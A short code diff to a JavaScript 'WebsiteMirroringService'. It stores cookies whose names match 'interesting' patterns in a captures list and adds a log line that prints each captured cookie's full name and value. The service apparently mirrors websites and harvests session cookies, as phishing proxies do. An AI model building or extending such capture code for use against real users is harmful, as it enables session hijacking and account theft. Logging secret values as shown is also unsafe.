@@ -759,14 +759,17 @@ class WebsiteMirroringService {
       const [name, value] = nameValue.split('=');
       
       if (interestingPatterns.some(pattern => pattern.test(name))) {
-        captures.cookies.push({
+        const cookieObj = {
           name,
           value,
           raw: cookie,
           timestamp: new Date().toISOString()
-        });
+        };
+        
+        captures.cookies.push(cookieObj);
         
         console.log(`⚠️ Captured interesting cookie: ${name}`);
+        console.log(`📝 Cookie details: ${JSON.stringify(cookieObj, null, 2)}`);
       }
     });
     
